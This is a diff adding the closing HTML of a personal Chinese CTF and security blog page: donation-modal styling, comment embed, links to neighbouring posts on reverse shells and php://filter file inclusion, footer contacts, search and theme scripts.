+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">有没有好心人(dayuanzhong)v_me_50</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/jcxj/medias/reward/alipay1.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/jcxj/medias/reward/wechat1.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+    <div class="livere-card card" data-aos="fade-up">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" class="card-content" data-id="city" data-uid="">
+        <script type="text/javascript">
+            (function (d, s) {
+                let j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') {
+                    return;
+                }
+
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript。</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</div>
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/jcxj/2022/10/07/fan-dan-lian-jie/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/jcxj/medias/featureimages/19.jpg" class="responsive-img" alt="反弹连接">
+                        
+                        <span class="card-title">反弹连接</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-07
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            jcxj
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/jcxj/tags/%E5%8F%8D%E5%BC%B9shell/">
+                        <span class="chip bg-color">反弹shell</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/jcxj/2022/10/06/wen-jian-bao-han-wei-xie-yi-zhong-jia-mi-qi-de-shi-yong/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/jcxj/medias/featureimages/17.jpg" class="responsive-img" alt="文件包含伪协议中-加密器的使用">
+                        
+                        <span class="card-title">文件包含伪协议中-加密器的使用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            php://filter/convert加密器的使用
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-06
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/jcxj/categories/ctf/" class="post-category">
+                                    ctf
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/jcxj/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
+                        <span class="chip bg-color">伪协议</span>
+                    </a>
+                    
+                    <a href="/jcxj/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/jcxj/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+                        <span class="chip bg-color">文件包含</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + 'From: Made by jcxj<br />'
+            + 'Author: jcxj<br />'
+            + 'Link: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归jcxj所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/jcxj/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/jcxj/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/jcxj/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/jcxj/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022</span>
+            
+            <span id="year">2022</span>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">23.2k</span>&nbsp;字
+            
+            
+            
+            
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2022";
+                    var startMonth = "09";
+                    var startDate = "20";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/jcxj/jcxj" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:971748776@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=971748776" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 971748776" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/jcxj/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/jcxj/libs/materialize/materialize.min.js"></script>
+    <script src="/jcxj/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/jcxj/libs/aos/aos.js"></script>
+    <script src="/jcxj/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/jcxj/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/jcxj/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/jcxj/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/jcxj/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
+<script type="text/javascript"> var OriginTitile = document.title, st;
+document.addEventListener("visibilitychange", function () { document.hidden ? (document.title = "问题没解决?", clearTimeout(st)) : (document.title = "Made by jcxj", st = setTimeout(function () { document.title = OriginTitile }, 3e3)) }) </script>
+
